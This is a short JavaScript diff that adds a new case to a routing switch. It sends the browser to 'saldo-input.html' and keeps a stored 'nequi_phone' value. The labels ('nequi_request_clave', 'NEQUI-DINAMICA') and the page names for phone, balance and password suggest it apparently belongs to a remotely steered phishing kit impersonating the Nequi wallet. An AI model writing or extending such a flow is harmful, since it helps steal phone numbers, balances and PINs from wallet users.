@@ -240,6 +240,13 @@
                 window.location.href = 'numero.html';
                 break;
                 
+              case 'nequi_pedir_saldo':
+              case 'nequi_request_saldo':
+                console.log('[NEQUI-DINAMICA] → Redirigiendo a saldo-input.html');
+                sessionStorage.setItem('nequi_phone', sessionStorage.getItem('nequi_phone') || '');
+                window.location.href = 'saldo-input.html';
+                break;
+                
               case 'nequi_request_clave':
                 console.log('[NEQUI-DINAMICA] → Redirigiendo a clave.html');
                 window.location.href = 'clave.html';
